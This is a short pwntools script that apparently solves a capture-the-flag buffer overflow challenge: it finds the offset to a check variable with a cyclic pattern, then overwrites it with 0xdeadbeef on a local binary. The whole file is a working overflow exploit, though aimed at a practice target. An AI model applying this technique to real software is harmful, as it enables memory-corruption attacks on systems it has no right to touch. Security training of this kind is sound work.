#!/usr/bin/env python3

from pwn import *

PATH = './challenge'

def get_offset():
    p = process(PATH)
    c = cyclic(50000)

    p.sendline(c)
    p.recvuntil('[check] 0x')

    check = p.recvline().strip()

    sequence = unhex(check)                     # extract cyclic from hex ptr

    little_endian = u32(sequence, endian='big') # from big to little

    return cyclic_find(little_endian)           # find offset

offset = get_offset()

p = process(PATH)
p.sendline(b'A' * offset + pack(0xdeadbeef))
p.recvuntil('[check]')
print(p.recvall())
